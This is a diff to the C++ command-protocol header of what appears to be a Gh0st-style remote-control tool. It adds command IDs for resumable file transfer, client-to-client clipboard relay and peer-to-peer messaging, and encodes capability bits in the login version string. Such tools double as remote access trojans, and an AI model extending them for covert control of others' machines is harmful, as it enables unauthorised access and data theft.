@@ -118,6 +118,9 @@ inline int isValid_10s()
 // 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
 #define DLL_VERSION __DATE__		// DLL版本
 
+// 客户端能力位
+#define CLIENT_CAP_V2   0x0001      // 支持 V2 文件传输
+
 #define TALK_DLG_MAXLEN 1024		// 最大输入字符长度
 
 // 客户端状态: 1-被控端退出 2-主控端退出
@@ -227,6 +230,16 @@ enum {
     CMD_RESET_VIRTUAL_DESKTOP = 83, // 重置虚拟桌面（关闭所有窗口重新启动）
     CMD_SWITCH_WINDOW = 84,         // 切换窗口（类似 Alt+Tab）
 
+    // V2 文件传输（C2C + 断点续传）
+    COMMAND_SEND_FILE_V2 = 85,      // V2 文件传输
+    COMMAND_FILE_RESUME = 86,       // V2 断点续传控制（响应）
+    COMMAND_CLIPBOARD_V2 = 87,      // V2 剪贴板请求（C2C）
+    COMMAND_FILE_QUERY_RESUME = 88, // V2 查询续传状态（请求）
+    COMMAND_C2C_PREPARE = 89,       // C2C 准备接收（通知目标捕获目录）
+    COMMAND_C2C_TEXT = 90,          // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+    COMMAND_FILE_COMPLETE_V2 = 91,  // V2 文件完成校验: [cmd][transferID][fileIndex][fileSize][sha256]
+    COMMAND_C2C_PREPARE_RESP = 92,  // C2C 准备响应（返回目标目录给发送方）
+
     TOKEN_SCROLL_FRAME = 99,        // 滚动优化帧
     // 服务端发出的标识
     TOKEN_AUTH = 100,				// 要求验证
@@ -303,6 +316,7 @@ enum {
     TOKEN_CLIENT_MSG = 241,         // 客户端消息
     CMD_SET_GROUP = 242,            // 修改分组
     CMD_EXECUTE_DLL_NEW = 243,	    // 执行代码
+	CMD_PEER_TO_PEER = 244,         // P2P通信
 };
 
 enum MachineCommand {
@@ -849,7 +863,7 @@ typedef struct  LOGIN_INFOR {
     {
         memset(this, 0, sizeof(LOGIN_INFOR));
         bToken = TOKEN_LOGIN;
-        strcpy_s(moduleVersion, DLL_VERSION);
+        sprintf_s(moduleVersion, "%s-%04X", DLL_VERSION, CLIENT_CAP_V2);
     }
     LOGIN_INFOR& Speed(unsigned long speed)
     {
